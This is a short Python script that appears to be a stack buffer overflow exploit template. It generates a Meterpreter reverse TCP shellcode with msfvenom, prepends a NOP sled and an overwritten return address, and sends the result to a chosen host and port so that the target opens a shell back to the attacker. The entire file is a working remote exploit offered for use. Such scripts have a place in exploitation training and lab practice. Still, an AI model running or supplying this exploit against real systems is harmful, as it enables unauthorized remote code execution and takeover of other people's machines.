#!/usr/bin/python3
import subprocess
import socket
from binascii import unhexlify, Error
import argparse

args = argparse.ArgumentParser()
args.add_argument("RHOST", help="The IP to send byte array to.")
args.add_argument("RPORT", help="The port to send pattern to.", type=int)
args.add_argument("offset", help="Offset of Instruction Pointer", type=int)
args.add_argument("retn", help="The return address. eg 0x5FF910")
args.add_argument("LHOST", help="Local Host")
args.add_argument("LPORT", help="Local Port")
args.add_argument("-b", help='Known bad chars. eg "\\x00\\x12\\xca"')
args = args.parse_args()


bad_char = ("-b " + args.b) if args.b else "" 
venom = (f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={args.LHOST} "\
        f"LPORT={args.LPORT} {bad_char} 2>/dev/null -f hex')
try:
    shell_code = unhexlify(subprocess.getoutput(venom))
except Error as error:
    print("Command Failed :( -", error)
    exit()
sc_length = len(shell_code)
print(f"Length of shellcode = {sc_length}")

retn = int.to_bytes(int(args.retn, 16), 4, "little")
payload = (b"\x90" * args.offset) + retn + (b"\x90" * 16) + shell_code

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.RHOST, args.RPORT))
    print(sock.recv(1024).decode())
    print(f"Sending exploit.")
    sock.send(payload)
    print(sock.recv(1024).decode())
    sock.close
except Exception as error:
    print("It's dead Jim!")
    print(error)